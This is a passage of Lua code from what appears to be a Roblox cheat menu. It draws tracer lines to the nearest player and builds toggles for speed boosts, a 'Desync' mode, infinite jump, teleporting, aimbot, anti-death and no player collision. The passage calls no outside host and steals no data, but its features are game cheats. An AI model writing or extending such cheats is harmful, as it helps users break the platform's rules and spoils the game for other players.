	_G.__UnoTrackStopper(function() tracerGui:Destroy() end)
	local playerTracerState = { scanElapsed = math.huge, targetRoot = nil }

	_G.__UnoTrackConn(RunService.RenderStepped:Connect((function(dt)
	if not toggleStates["Player Tracers"] then
	if playerTracer.Visible then playerTracer.Visible = false end
	playerTracerState.targetRoot = nil
	playerTracerState.scanElapsed = math.huge
	return
	end
	local ok = pcall(function()

	local activeCamera = workspace.CurrentCamera
	local myCharacter = Player.Character
	local myRoot = myCharacter and (myCharacter:FindFirstChild("LowerTorso") or myCharacter:FindFirstChild("HumanoidRootPart") or myCharacter:FindFirstChild("Torso"))
	if not activeCamera or not myRoot then
	playerTracer.Visible = false
	return
	end

	local myPosition = myRoot.Position
	playerTracerState.scanElapsed = playerTracerState.scanElapsed + (dt or 0)
	local cachedRoot = playerTracerState.targetRoot
	local cachedCharacter = cachedRoot and cachedRoot.Parent
	local cachedHumanoid = cachedCharacter and cachedCharacter:FindFirstChildOfClass("Humanoid")
	local cachedValid = cachedRoot and cachedRoot.Parent and (not cachedHumanoid or cachedHumanoid.Health > 0)

	if playerTracerState.scanElapsed >= 0.12 or not cachedValid then
	playerTracerState.scanElapsed = 0
	local closestRoot, closestDistanceSq = nil, math.huge
	for _, otherPlayer in ipairs(Players:GetPlayers()) do
	if otherPlayer ~= Player then
	local character = otherPlayer.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local root = character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("LowerTorso") or character:FindFirstChild("Torso"))
	if root and root:IsA("BasePart") and (not humanoid or humanoid.Health > 0) then
	local delta = root.Position - myPosition
	local distanceSq = delta:Dot(delta)
	if distanceSq < closestDistanceSq then
	closestRoot, closestDistanceSq = root, distanceSq
	end
	end
	end
	end
	playerTracerState.targetRoot = closestRoot
	end

	local closestRoot = playerTracerState.targetRoot
	if not closestRoot or not closestRoot.Parent then
	playerTracer.Visible = false
	return
	end
	local closestPosition = closestRoot.Position

	local from = activeCamera:WorldToViewportPoint(myPosition - Vector3.new(0, myRoot.Size.Y * 0.35, 0))
	local to, targetOnScreen = activeCamera:WorldToViewportPoint(closestPosition)
	local viewport = activeCamera.ViewportSize
	local fromPoint = Vector2.new(from.X, from.Y)
	local targetPoint = Vector2.new(to.X, to.Y)

	if not targetOnScreen or to.Z <= 0 then
	local center = viewport * 0.5
	local direction = targetPoint - center
	if to.Z <= 0 then direction = -direction end
	if direction.Magnitude < 0.001 then direction = Vector2.new(0, -1) end
	local limit = Vector2.new(math.max(8, center.X - 8), math.max(8, center.Y - 8))
	local scaleX = limit.X / math.max(math.abs(direction.X), 0.001)
	local scaleY = limit.Y / math.max(math.abs(direction.Y), 0.001)
	targetPoint = center + direction * math.min(scaleX, scaleY)
	end

	if from.Z <= 0 or fromPoint.X < 0 or fromPoint.X > viewport.X or fromPoint.Y < 0 or fromPoint.Y > viewport.Y then
	fromPoint = Vector2.new(viewport.X * 0.5, viewport.Y - 8)
	end

	local delta = targetPoint - fromPoint
	local midpoint = (fromPoint + targetPoint) * 0.5
	playerTracer.Position = UDim2.fromOffset(midpoint.X, midpoint.Y)
	playerTracer.Size = UDim2.fromOffset(math.max(delta.Magnitude, 1), 2)
	playerTracer.Rotation = math.deg(math.atan2(delta.Y, delta.X))
	local _, tracerColor = getESPThemeColors()
	playerTracer.BackgroundColor3 = tracerColor
	playerTracer.Visible = true
	end)
	if not ok then pcall(function() playerTracer.Visible = false end) end
	end)))
	end

	local function makeToggleWithInput(parent, text, featureName, speedKey, fmtFn, parseFn)
	local container = Instance.new("Frame")
	container.Name = tostring(featureName or text or "Input") .. "Stub"
	container.BackgroundTransparency = 1
	container.Visible = false
	container.Parent = parent
	return {
	container = container,
	input = nil,
	activeRef = function() return toggleStates[featureName] == true end,
	}
	end

	local tabPages = {}
	local tabNames = {"Movement", "Combat", "Visuals"}

	local function createTabPage(name)
	local page = Instance.new("ScrollingFrame", ContentArea)
	page.Name = name .. "PageStub"
	page.BackgroundTransparency = 1
	page.BorderSizePixel = 0
	page.ScrollBarThickness = 0
	page.Visible = false
	tabPages[name] = page
	end
	for _, name in ipairs(tabNames) do createTabPage(name) end

	local function selectSectionTab(selected)
	local selectedPage = tabPages[selected]
	if not selectedPage then return end
	for name, page in pairs(tabPages) do
	page.Visible = (name == selected)
	end
	end

	selectSectionTab("Movement")

	_speedCardRefs = _speedCardRefs or {}
	local function makeUraniumSpeedCard(parent, cardTitle, modeName, boostKey, stealKey, featureName)
	local container = Instance.new("Frame")
	container.Name = tostring(modeName or cardTitle or "Speed") .. "SpeedStub"
	container.BackgroundTransparency = 1
	container.Visible = false
	container.Parent = parent
	if featureName then FeatureToggles[featureName] = function() selectMode(modeName) end end
	return container
	end

	local speedSection = makeUraniumSection(tabPages.Movement, "SPEED")
	makeUraniumSpeedCard(speedSection, "Normal Speed", "Normal", "NormalBoost", "NormalSteal", "SelectNormalMode")
	makeUraniumSpeedCard(speedSection, "Lagger Speed", "Lagger", "LaggerBoost", "LaggerSteal", "SelectLaggerMode")

	local function createCustomSpeedCard(cs)
	local featureName = "SelectCustomMode_" .. cs.name
	local boostKey = "CustomBoost_" .. cs.name
	local stealKey = "CustomSteal_" .. cs.name
	speedValues[boostKey] = cs.boost
	speedValues[stealKey] = cs.steal
	FeatureToggles[featureName] = function() selectMode(cs.name) end
	local card = makeUraniumSpeedCard(speedSection, cs.name, cs.name, boostKey, stealKey, featureName)
	local delBtn = Instance.new("TextButton", card)
	delBtn.Size = UDim2.new(0, 18, 0, 18)
	delBtn.AnchorPoint = Vector2.new(1, 1)
	delBtn.Position = UDim2.new(1, -8, 1, -8)
	delBtn.ZIndex = 30
	delBtn.BackgroundColor3 = Color3.fromRGB(240, 200, 200)
	delBtn.BorderSizePixel = 0
	delBtn.Text = "x"
	delBtn.TextColor3 = Color3.fromRGB(180, 60, 60)
	delBtn.TextSize = 11
	delBtn.Font = Enum.Font.GothamBold
	delBtn.AutoButtonColor = false
	delBtn.TextXAlignment = Enum.TextXAlignment.Center
	delBtn.TextYAlignment = Enum.TextYAlignment.Center
	Instance.new("UICorner", delBtn).CornerRadius = UDim.new(0, 4)
	connectBtn(delBtn, function()
	for i = #customSpeeds, 1, -1 do
	if customSpeeds[i].name == cs.name then table.remove(customSpeeds, i) break end
	end
	if selectedMode == cs.name then selectMode("Normal") end
	pcall(function() card:Destroy() end)
	saveConfig()
	end)
	return card
	end

	for _, cs in ipairs(customSpeeds) do
	pcall(function() createCustomSpeedCard(cs) end)
	end

	do
	local addBtn = Instance.new("TextButton", speedSection)
	addBtn.Size = UDim2.new(1, -2, 0, 28)
	addBtn.BackgroundColor3 = Color3.fromRGB(235, 240, 245)
	addBtn.BackgroundTransparency = 0.55
	addBtn.BorderSizePixel = 0
	addBtn.Text = "+ Add Custom Speed"
	addBtn.Visible = false
	addBtn.TextColor3 = Color3.fromRGB(100, 140, 200)
	addBtn.TextSize = 11
	addBtn.Font = Enum.Font.GothamBold
	addBtn.AutoButtonColor = false
	Instance.new("UICorner", addBtn).CornerRadius = UDim.new(0, 6)
	local addStroke = Instance.new("UIStroke", addBtn)
	addStroke.Color = Color3.fromRGB(0, 0, 0)
	addStroke.Thickness = 1
	addStroke.Transparency = 0.3

	local formCard = nil
	connectBtn(addBtn, function()
	if formCard then pcall(function() formCard:Destroy() end) formCard = nil return end
	formCard = Instance.new("Frame", speedSection)
	formCard.Size = UDim2.new(1, -2, 0, 96)
	formCard.BackgroundColor3 = Color3.fromRGB(230, 238, 245)
	formCard.BorderSizePixel = 0
	Instance.new("UICorner", formCard).CornerRadius = UDim.new(0, 6)
	local formStroke = Instance.new("UIStroke", formCard)
	formStroke.Color = Color3.fromRGB(0, 0, 0)
	formStroke.Thickness = 1

	local nameLbl = Instance.new("TextLabel", formCard)
	nameLbl.Size = UDim2.new(0, 40, 0, 14)
	nameLbl.Position = UDim2.new(0, 8, 0, 6)
	nameLbl.BackgroundTransparency = 1
	nameLbl.Text = "Name"
	nameLbl.TextColor3 = Color3.fromRGB(100, 140, 190)
	nameLbl.TextSize = 9
	nameLbl.Font = Enum.Font.GothamBold
	nameLbl.TextXAlignment = Enum.TextXAlignment.Left
	local nameBox = Instance.new("TextBox", formCard)
	nameBox.Size = UDim2.new(0, 120, 0, 20)
	nameBox.Position = UDim2.new(0, 8, 0, 21)
	nameBox.BackgroundColor3 = Color3.fromRGB(245, 247, 250)
	nameBox.BorderSizePixel = 0
	nameBox.Text = ""
	nameBox.PlaceholderText = "My Speed"
	nameBox.Font = Enum.Font.GothamBold
	nameBox.TextSize = 11
	nameBox.TextColor3 = Color3.fromRGB(30, 90, 200)
	nameBox.ClearTextOnFocus = false
	Instance.new("UICorner", nameBox).CornerRadius = UDim.new(0, 4)
	local nameStroke = Instance.new("UIStroke", nameBox)
	nameStroke.Color = Color3.fromRGB(0, 0, 0)
	nameStroke.Thickness = 1

	local boostLbl = Instance.new("TextLabel", formCard)
	boostLbl.Size = UDim2.new(0, 50, 0, 14)
	boostLbl.Position = UDim2.new(0, 140, 0, 6)
	boostLbl.BackgroundTransparency = 1
	boostLbl.Text = "Boost"
	boostLbl.TextColor3 = Color3.fromRGB(100, 140, 190)
	boostLbl.TextSize = 9
	boostLbl.Font = Enum.Font.GothamBold
	boostLbl.TextXAlignment = Enum.TextXAlignment.Left
	local boostBox = Instance.new("TextBox", formCard)
	boostBox.Size = UDim2.new(0, 56, 0, 20)
	boostBox.Position = UDim2.new(0, 140, 0, 21)
	boostBox.BackgroundColor3 = Color3.fromRGB(220, 238, 255)
	boostBox.BorderSizePixel = 0
	boostBox.Text = "59"
	boostBox.Font = Enum.Font.GothamBold
	boostBox.TextSize = 12
	boostBox.TextColor3 = Color3.fromRGB(30, 90, 200)
	boostBox.TextXAlignment = Enum.TextXAlignment.Center
	boostBox.ClearTextOnFocus = false
	Instance.new("UICorner", boostBox).CornerRadius = UDim.new(0, 5)
	local boostStroke2 = Instance.new("UIStroke", boostBox)
	boostStroke2.Color = Color3.fromRGB(0, 0, 0)
	boostStroke2.Thickness = 1

	local stealLbl = Instance.new("TextLabel", formCard)
	stealLbl.Size = UDim2.new(0, 50, 0, 14)
	stealLbl.Position = UDim2.new(0, 204, 0, 6)
	stealLbl.BackgroundTransparency = 1
	stealLbl.Text = "Steal"
	stealLbl.TextColor3 = Color3.fromRGB(100, 140, 190)
	stealLbl.TextSize = 9
	stealLbl.Font = Enum.Font.GothamBold
	stealLbl.TextXAlignment = Enum.TextXAlignment.Left
	local stealBox = Instance.new("TextBox", formCard)
	stealBox.Size = UDim2.new(0, 56, 0, 20)
	stealBox.Position = UDim2.new(0, 204, 0, 21)
	stealBox.BackgroundColor3 = Color3.fromRGB(220, 238, 255)
	stealBox.BorderSizePixel = 0
	stealBox.Text = "29"
	stealBox.Font = Enum.Font.GothamBold
	stealBox.TextSize = 12
	stealBox.TextColor3 = Color3.fromRGB(30, 90, 200)
	stealBox.TextXAlignment = Enum.TextXAlignment.Center
	stealBox.ClearTextOnFocus = false
	Instance.new("UICorner", stealBox).CornerRadius = UDim.new(0, 5)
	local stealStroke2 = Instance.new("UIStroke", stealBox)
	stealStroke2.Color = Color3.fromRGB(0, 0, 0)
	stealStroke2.Thickness = 1

	boostBox.InputChanged:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.TextInput then
	boostBox.Text = boostBox.Text:gsub("[^0-9]", "")
	end
	end)
	stealBox.InputChanged:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.TextInput then
	stealBox.Text = stealBox.Text:gsub("[^0-9]", "")
	end
	end)

	local confirmBtn = Instance.new("TextButton", formCard)
	confirmBtn.Size = UDim2.new(1, -16, 0, 24)
	confirmBtn.Position = UDim2.new(0, 8, 0, 50)
	confirmBtn.BackgroundColor3 = Color3.fromRGB(50, 130, 255)
	confirmBtn.BorderSizePixel = 0
	confirmBtn.Text = "Add Speed"
	confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	confirmBtn.TextSize = 11
	confirmBtn.Font = Enum.Font.GothamBold
	confirmBtn.AutoButtonColor = false
	Instance.new("UICorner", confirmBtn).CornerRadius = UDim.new(0, 5)

	local errLbl = Instance.new("TextLabel", formCard)
	errLbl.Size = UDim2.new(1, -16, 0, 14)
	errLbl.Position = UDim2.new(0, 8, 0, 78)
	errLbl.BackgroundTransparency = 1
	errLbl.Text = ""
	errLbl.TextColor3 = Color3.fromRGB(200, 60, 60)
	errLbl.TextSize = 9
	errLbl.Font = Enum.Font.GothamBold
	errLbl.TextXAlignment = Enum.TextXAlignment.Left

	connectBtn(confirmBtn, function()
	local cname = nameBox.Text:match("^%s*(.-)%s*$")
	local cboost = tonumber(boostBox.Text)
	local csteal = tonumber(stealBox.Text)
	if not cname or #cname < 1 then errLbl.Text = "Enter a name" return end
	if not cboost or cboost < 1 or cboost > 200 then errLbl.Text = "Boost: 1-200" return end
	if not csteal or csteal < 1 or csteal > 200 then errLbl.Text = "Steal: 1-200" return end
	for _, cs in ipairs(customSpeeds) do
	if cs.name == cname then errLbl.Text = "Name already exists" return end
	end
	if cname == "Normal" or cname == "Lagger" or cname == "Desync" then errLbl.Text = "Reserved name" return end
	local cs = { name = cname, boost = cboost, steal = csteal }
	table.insert(customSpeeds, cs)
	pcall(function() createCustomSpeedCard(cs) end)
	pcall(function() formCard:Destroy() end)
	formCard = nil
	saveConfig()
	end)
	end)
	end

	for _, ref in ipairs(_speedCardRefs) do if ref.updateVisual then pcall(ref.updateVisual) end end

	local movementSection = makeUraniumSection(tabPages.Movement, "MOVEMENT")
	local autoplayRow = makeToggle(movementSection, "Auto Play", "Autoplay")
		do
	local autoplayCard = nil
	for _, child in ipairs(autoplayRow:GetChildren()) do
	if child:IsA("TextButton") then autoplayCard = child; break end
	end
	if autoplayCard then
	local autoplayModeButton = Instance.new("TextButton", autoplayCard)
	autoplayModeButton.Name = "AutoplayModeButton"
	autoplayModeButton.Size = UDim2.new(0, 56, 0, 20)
	autoplayModeButton.Position = UDim2.new(1, -120, 0.5, -10)
	autoplayModeButton.BackgroundColor3 = Color3.fromRGB(30,30,38)
	autoplayModeButton.BorderSizePixel = 0
	autoplayModeButton.Text = string.upper(_G.__autoplayMode or "Full")
	autoplayModeButton.TextColor3 = Color3.fromRGB(225,238,255)
	autoplayModeButton.TextSize = 10
	autoplayModeButton.Font = Enum.Font.GothamBold
	autoplayModeButton.AutoButtonColor = false
	autoplayModeButton.ZIndex = 10
	Instance.new("UICorner", autoplayModeButton).CornerRadius = UDim.new(0, 4)
	local autoplayModeStroke = Instance.new("UIStroke", autoplayModeButton)
	autoplayModeStroke.Color = Color3.fromRGB(255,255,255)
	autoplayModeStroke.Thickness = 1
	autoplayModeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	attachCleanHubTap(autoplayModeButton, function()
	_G.__autoplayMode = (_G.__autoplayMode == "Semi") and "Full" or "Semi"
	autoplayModeButton.Text = string.upper(_G.__autoplayMode)
	saveConfig()
	end)
	end
	end
	-- Auto Carry Speed removed from UI
	do local _ = makeToggleNoKeybind(movementSection, "Auto Carry Speed", "Auto Carry Speed"); if _ then _.Visible = false end end
	do
	local carryRow = makeToggle(movementSection, "Carry Speed", "Carry Speed")

	local carryCard = nil
	for _, ch in ipairs(carryRow:GetChildren()) do
	if ch:IsA("TextButton") then carryCard = ch; break end
	end

	pcall(function() styleSmallToggle(carryRow) end)

	if carryCard then
	local vBtn = Instance.new("TextButton", carryCard)
	vBtn.Size = UDim2.new(0, 56, 0, 20)
	vBtn.Position = UDim2.new(1, -120, 0.5, -10)
	vBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	vBtn.BorderSizePixel = 0
	vBtn.Text = "V2"
	vBtn.TextColor3 = Color3.fromRGB(225,238,255)
	vBtn.TextSize = 10
	vBtn.Font = Enum.Font.GothamBold
	vBtn.AutoButtonColor = false
	vBtn.ZIndex = 10
	Instance.new("UICorner", vBtn).CornerRadius = UDim.new(0, 4)
	local vStroke = Instance.new("UIStroke", vBtn)
	vStroke.Color = Color3.fromRGB(255,255,255)
	vStroke.Thickness = 1
	vStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local function getBindPill()
	for _, c in ipairs(carryCard:GetChildren()) do
	if c:IsA("TextButton") and c ~= vBtn and c.Size.X.Offset == 48 and c.Position.X.Scale == 1 and c.Position.X.Offset == -54 then
	return c
	end
	end
	return nil
	end

	local function applyV1Mode()
	carrySpeedMode = "v1"
	vBtn.Text = "V1"
	vBtn.TextColor3 = Color3.fromRGB(225,238,255)
	vBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	vBtn.Position = UDim2.new(1, -120, 0.5, -10)
	local pill = getBindPill()
	if pill then pill.Visible = true end
	end

	local function applyV2Mode()
	carrySpeedMode = "v2"
	vBtn.Text = "V2"
	vBtn.TextColor3 = Color3.fromRGB(225,238,255)
	vBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	vBtn.Position = UDim2.new(1, -120, 0.5, -10)
	local pill = getBindPill()
	if pill then pill.Visible = true end
	end

	applyV2Mode()
	vBtn.Visible = false
	end
	end

	pcall(function()
	if _G and _G.__setNoPlayerCollision then _G.__setNoPlayerCollision(true) end
	end)

	local function styleSmallToggle(row)
	if not row then return end
	pcall(function()
	row.Size = UDim2.new(1, -2, 0, GUI_METRICS.compactCardH)
	for _, c in ipairs(row:GetChildren()) do
	if c:IsA("TextButton") then
	c.Size = UDim2.new(1, 0, 0, GUI_METRICS.compactCardH)
	c.BackgroundColor3 = Color3.fromRGB(25,31,42)
	c.BackgroundTransparency = 0.35
	c.BorderSizePixel = 0
	c.ZIndex = 21
	local corner = c:FindFirstChildOfClass("UICorner")
	if corner then corner.CornerRadius = UDim.new(0,5) else Instance.new("UICorner", c).CornerRadius = UDim.new(0,5) end
	local stroke = c:FindFirstChildOfClass("UIStroke")
	if stroke then stroke.Color = Color3.fromRGB(0,0,0); stroke.Thickness = 1; stroke.Transparency = 0 end
	break
	end
	end
	end)
	end

	pcall(function()
	local m = _featureToggleMap and _featureToggleMap["Autoplay"]
	if m and m.card and m.card.Parent then styleSmallToggle(m.card.Parent) end
	end)
	pcall(function()
	local m = _featureToggleMap and _featureToggleMap["Carry Speed"]
	if m and m.card and m.card.Parent then styleSmallToggle(m.card.Parent) end
	end)
	pcall(function()
	local m = _featureToggleMap and _featureToggleMap["TP Bat"]
	if m and m.card and m.card.Parent then styleSmallToggle(m.card.Parent) end
	end)

	_G.__UnoInfJumpMode = _G.__UnoInfJumpMode or "hold"
	makeToggleNoKeybind(movementSection, "Unwalk", "Unwalk")
	local infJumpToggleRow = makeToggleNoKeybind(movementSection, "Inf Jump", "Inf Jump")
	if infJumpToggleRow then
	local infJumpModeBtn = Instance.new("TextButton", infJumpToggleRow)
	infJumpModeBtn.Name = "InfJumpModeBtn"
	infJumpModeBtn.Size = UDim2.new(0, 66, 0, 20)
	infJumpModeBtn.Position = UDim2.new(1, -74, 0.5, -10)
	infJumpModeBtn.AnchorPoint = Vector2.new(0, 0)
	infJumpModeBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	infJumpModeBtn.BorderSizePixel = 0
	infJumpModeBtn.Text = (_G.__UnoInfJumpMode == "hold") and "HOLD" or "MANUAL"
	infJumpModeBtn.TextColor3 = Color3.fromRGB(225,238,255)
	infJumpModeBtn.Font = Enum.Font.GothamBold
	infJumpModeBtn.TextSize = 10
	infJumpModeBtn.AutoButtonColor = false
	infJumpModeBtn.ZIndex = 30
	Instance.new("UICorner", infJumpModeBtn).CornerRadius = UDim.new(0, 4)
	local infJumpModeStroke = Instance.new("UIStroke", infJumpModeBtn)
	infJumpModeStroke.Color = Color3.fromRGB(255,255,255)
	infJumpModeStroke.Thickness = 1
	infJumpModeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local function updateInfJumpModeButton()
	local isHold = (_G.__UnoInfJumpMode == "hold")
	infJumpModeBtn.Text = isHold and "HOLD" or "MANUAL"
	infJumpModeBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	infJumpModeBtn.TextColor3 = Color3.fromRGB(225,238,255)
	infJumpModeStroke.Color = Color3.fromRGB(255,255,255)
	infJumpModeStroke.Thickness = 1
	infJumpModeBtn.TextStrokeTransparency = 1
	end
	updateInfJumpModeButton()
	connectBtn(infJumpModeBtn, function()
	_G.__UnoInfJumpMode = (_G.__UnoInfJumpMode == "hold") and "manual" or "hold"
	updateInfJumpModeButton()
	if toggleStates["Inf Jump"] then
	if _G.__UnoInfJumpMode == "hold" then
	startInfJump()
	else
	stopInfJump()
	end
	end
	end)
	end
	local tpDownRow = makeToggle(movementSection, "TP Down", "TP Down")
	pcall(function() styleSmallToggle(tpDownRow) end)
	makeToggleWithInput(movementSection, "Auto TP Down", "Auto TP Down", "AutoTPDownHeight",
	function(value) return tostring(math.floor((tonumber(value) or 20) + 0.5)) end,
	function(value) return math.clamp(math.floor((tonumber(value) or 20) + 0.5), 1, 1000) end)

	local combatSection = makeUraniumSection(tabPages.Combat, "COMBAT")
	makeToggleNoKeybind(combatSection, "Anti Ragdoll", "Anti Ragdoll")
	makeToggleNoKeybind(combatSection, "Ragdoll Counter", "Ragdoll Counter")
	makeToggleNoKeybind(combatSection, "Medusa Counter", "Medusa Counter")

	_G.__UnoAntiDieGuiEnabled = function()
	return toggleStates["Anti Die"] == true
	end
	FeaturePostToggle["Anti Die"] = function(active)
	pcall(function() if _G.__UnoAntiDieSource then _G.__UnoAntiDieSource("toggle", active) end end)
	end
	makeToggleNoKeybind(combatSection, "Anti Die", "Anti Die")
	FeaturePostToggle["Anti Die"](toggleStates["Anti Die"] == true)

	do
	local aimbotRow = makeToggle(combatSection, "Aimbot", "Aimbot")
	pcall(function() styleSmallToggle(aimbotRow) end)
	end

	do
local tpBatRow = makeToggle(combatSection, "TP Bat", "TP Bat", function(extension)
local container = extension.Parent
local card = container and container:FindFirstChildOfClass("TextButton")
if not card then return 28 end

local batVersionPill = Instance.new("TextButton", card)
batVersionPill.Name = "BatVersionToggle"
batVersionPill.Size = UDim2.new(0, 64, 0, 22)
batVersionPill.Position = UDim2.new(1, -118, 0.5, -11)
batVersionPill.BackgroundColor3 = Color3.fromRGB(30,30,38)
batVersionPill.BorderSizePixel = 0
batVersionPill.Text = "V" .. tostring(_G.__batVersion or 1)
batVersionPill.TextColor3 = Color3.fromRGB(225,238,255)
batVersionPill.Font = Enum.Font.GothamBold
batVersionPill.TextSize = 10
batVersionPill.AutoButtonColor = false
batVersionPill.Active = false
batVersionPill.Selectable = false

batVersionPill.Visible = false
batVersionPill.ZIndex = 30
Instance.new("UICorner", batVersionPill).CornerRadius = UDim.new(0, 4)
local bvStroke = Instance.new("UIStroke", batVersionPill)
bvStroke.Color = Color3.fromRGB(255,255,255)
bvStroke.Thickness = 1
bvStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local distanceConfigPill = Instance.new("TextButton", card)
distanceConfigPill.Name = "BatConfigToggle"
distanceConfigPill.Size = UDim2.new(0, isMobile and 50 or 64, 0, isMobile and 18 or 22)
distanceConfigPill.Position = UDim2.new(1, isMobile and -88 or -118, 0.5, isMobile and -9 or -11)
distanceConfigPill.BackgroundColor3 = Color3.fromRGB(45, 48, 58)
distanceConfigPill.BorderSizePixel = 0
distanceConfigPill.Text = ""
distanceConfigPill.AutoButtonColor = false
distanceConfigPill.ZIndex = 30
Instance.new("UICorner", distanceConfigPill).CornerRadius = UDim.new(0, 4)
local distanceToggleStroke = Instance.new("UIStroke", distanceConfigPill)
distanceToggleStroke.Color = Color3.fromRGB(160, 175, 195)
distanceToggleStroke.Thickness = 1
distanceToggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local configToggleLabel = Instance.new("TextLabel", distanceConfigPill)
configToggleLabel.Size = UDim2.new(0, 30, 1, 0)
configToggleLabel.Position = UDim2.new(0, 5, 0, 0)
configToggleLabel.BackgroundTransparency = 1
configToggleLabel.Text = "GUI"
configToggleLabel.TextColor3 = Color3.fromRGB(235, 240, 250)
configToggleLabel.Font = Enum.Font.GothamBold
configToggleLabel.TextSize = 8
configToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
configToggleLabel.ZIndex = 31

local configSwitchTrack = Instance.new("Frame", distanceConfigPill)
configSwitchTrack.Size = UDim2.new(0, 24, 0, 12)
configSwitchTrack.Position = UDim2.new(1, -29, 0.5, -6)
configSwitchTrack.BackgroundColor3 = Color3.fromRGB(25, 27, 33)
configSwitchTrack.BorderSizePixel = 0
configSwitchTrack.ZIndex = 31
Instance.new("UICorner", configSwitchTrack).CornerRadius = UDim.new(1, 0)

local configSwitchKnob = Instance.new("Frame", configSwitchTrack)
configSwitchKnob.Size = UDim2.new(0, 8, 0, 8)
configSwitchKnob.Position = UDim2.new(0, 2, 0.5, -4)
configSwitchKnob.BackgroundColor3 = Color3.fromRGB(155, 165, 180)
configSwitchKnob.BorderSizePixel = 0
configSwitchKnob.ZIndex = 32
Instance.new("UICorner", configSwitchKnob).CornerRadius = UDim.new(1, 0)

local distancePanel = Instance.new("Frame", extension)
distancePanel.Name = "BatV2DistanceConfig"
distancePanel.Size = UDim2.new(1, -2, 0, 78)
distancePanel.Position = UDim2.new(0, 1, 0, 4)
distancePanel.BackgroundColor3 = Color3.fromRGB(25, 31, 42)
distancePanel.BackgroundTransparency = 0.2
distancePanel.BorderSizePixel = 0
distancePanel.ZIndex = 22
Instance.new("UICorner", distancePanel).CornerRadius = UDim.new(0, 6)
local distancePanelStroke = Instance.new("UIStroke", distancePanel)
distancePanelStroke.Color = Color3.fromRGB(90, 130, 185)
distancePanelStroke.Transparency = 0.25
distancePanelStroke.Thickness = 1

local distanceLabel = Instance.new("TextLabel", distancePanel)
distanceLabel.Size = UDim2.new(1, -92, 0, 38)
distanceLabel.Position = UDim2.new(0, 10, 0, 0)
distanceLabel.BackgroundTransparency = 1
distanceLabel.Text = "DISTANCIA TP (STUDS)"
distanceLabel.TextColor3 = Color3.fromRGB(190, 210, 238)
distanceLabel.Font = Enum.Font.GothamBold
distanceLabel.TextSize = 10
distanceLabel.TextXAlignment = Enum.TextXAlignment.Left
distanceLabel.ZIndex = 23

local distanceInput = Instance.new("TextBox", distancePanel)
distanceInput.Name = "BatV2DistanceInput"
distanceInput.Size = UDim2.new(0, 70, 0, 26)
distanceInput.Position = UDim2.new(1, -80, 0, 6)
distanceInput.BackgroundColor3 = Color3.fromRGB(15, 20, 29)
distanceInput.BackgroundTransparency = 0.05
distanceInput.BorderSizePixel = 0
distanceInput.ClearTextOnFocus = false
distanceInput.Text = tostring(_G.__tpBatV2Distance or 8)
distanceInput.TextColor3 = Color3.fromRGB(245, 248, 255)
distanceInput.Font = Enum.Font.GothamBold
distanceInput.TextSize = 11
distanceInput.TextXAlignment = Enum.TextXAlignment.Center
distanceInput.ZIndex = 24
Instance.new("UICorner", distanceInput).CornerRadius = UDim.new(0, 4)
local distanceInputStroke = Instance.new("UIStroke", distanceInput)
distanceInputStroke.Color = Color3.fromRGB(125, 170, 225)
distanceInputStroke.Transparency = 0.2
distanceInputStroke.Thickness = 1
_G.__tpBatV2DistanceInput = distanceInput

local versionInsideLabel = Instance.new("TextLabel", distancePanel)
versionInsideLabel.Size = UDim2.new(1, -92, 0, 34)
versionInsideLabel.Position = UDim2.new(0, 10, 0, 40)
versionInsideLabel.BackgroundTransparency = 1
versionInsideLabel.Text = "VERSION TP BAT"
versionInsideLabel.TextColor3 = Color3.fromRGB(190, 210, 238)
versionInsideLabel.Font = Enum.Font.GothamBold
versionInsideLabel.TextSize = 10
versionInsideLabel.TextXAlignment = Enum.TextXAlignment.Left
versionInsideLabel.ZIndex = 23
versionInsideLabel.Visible = true

local versionInsidePill = Instance.new("TextButton", distancePanel)
versionInsidePill.Name = "BatVersionInsideConfig"
versionInsidePill.Size = UDim2.new(0, 70, 0, 26)
versionInsidePill.Position = UDim2.new(1, -80, 0, 44)
versionInsidePill.BackgroundColor3 = Color3.fromRGB(28, 92, 165)
versionInsidePill.BorderSizePixel = 0
versionInsidePill.Text = "V" .. tostring(_G.__batVersion or 1)
versionInsidePill.TextColor3 = Color3.fromRGB(245, 248, 255)
versionInsidePill.Font = Enum.Font.GothamBold
versionInsidePill.TextSize = 11
versionInsidePill.AutoButtonColor = false
versionInsidePill.Active = true
versionInsidePill.Visible = true
versionInsidePill.ZIndex = 24
Instance.new("UICorner", versionInsidePill).CornerRadius = UDim.new(0, 4)
local versionInsideStroke = Instance.new("UIStroke", versionInsidePill)
versionInsideStroke.Color = Color3.fromRGB(110, 190, 255)
versionInsideStroke.Transparency = 0.15
versionInsideStroke.Thickness = 1

local distanceConfigOpen = false
local function updateDistanceConfigVisibility()
local visible = distanceConfigOpen
distanceConfigPill.Visible = true
distanceConfigPill.BackgroundColor3 = visible and Color3.fromRGB(28, 92, 165) or Color3.fromRGB(45, 48, 58)
distanceToggleStroke.Color = visible and Color3.fromRGB(110, 190, 255) or Color3.fromRGB(160, 175, 195)
configSwitchTrack.BackgroundColor3 = visible and Color3.fromRGB(45, 135, 225) or Color3.fromRGB(25, 27, 33)
configSwitchKnob.BackgroundColor3 = visible and Color3.fromRGB(245, 248, 255) or Color3.fromRGB(155, 165, 180)
configSwitchKnob.Position = visible and UDim2.new(1, -10, 0.5, -4) or UDim2.new(0, 2, 0.5, -4)
extension.Visible = visible
extension.Size = UDim2.new(1, 0, 0, visible and 86 or 0)
container.Size = UDim2.new(1, -2, 0, visible and (GUI_METRICS.toggleH + 86) or GUI_METRICS.toggleH)
end

connectBtn(distanceConfigPill, function()
distanceConfigOpen = not distanceConfigOpen
updateDistanceConfigVisibility()
end)

distanceInput.FocusLost:Connect(function()
